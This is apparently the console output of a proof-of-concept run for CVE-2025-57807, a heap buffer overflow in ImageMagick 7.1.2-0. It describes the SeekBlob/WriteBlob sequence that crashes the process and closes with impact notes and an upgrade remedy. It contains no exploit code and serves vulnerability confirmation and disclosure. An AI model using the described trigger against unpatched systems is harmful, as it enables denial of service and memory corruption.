======================================================================
CVE-2025-57807 - ImageMagick Heap Buffer Overflow PoC
CWE-122: Heap-based Buffer Overflow
======================================================================

[Step 1] Checking ImageMagick version...
[+] ImageMagick version: 7.1.2-0
[!] VULNERABLE VERSION DETECTED

[Step 2] Triggering heap overflow exploit...
[*] Calling /?action=trigger to execute C PoC...

--- PoC Output ---
[+] Initial state: offset=0, extent=1
[+] After write 1 byte: offset=1, extent=1
[+] After seek to 256MiB: offset=268435456, extent=1
[!] CRITICAL: offset >> extent, next write will overflow!
[*] Triggering heap overflow with WriteBlob()...
Aborted (core dumped)

----------------------------------------
Exit code: -1

[CRASH DETECTED] Process terminated abnormally!
Signal: Unknown (-1)

*** VULNERABILITY CONFIRMED: HEAP OVERFLOW TRIGGERED ***

--- End Output ---


======================================================================
RESULT
======================================================================

[+] VULNERABLE - Exploit successful!

    Crash Type: CRASH
    Version: 7.1.2-0

Evidence:
  - SeekBlob() allowed offset=256MiB with extent=1
  - WriteBlob() attempted write to (data + 256MiB)
  - Heap memory write beyond allocation boundary
  - Process terminated with signal (SIGSEGV/SIGABRT)

Impact:
  - Denial of Service (crash)
  - Memory corruption
  - Potential Remote Code Execution

Remediation: Upgrade to ImageMagick >= 7.1.2-3 or >= 14.8.2
======================================================================
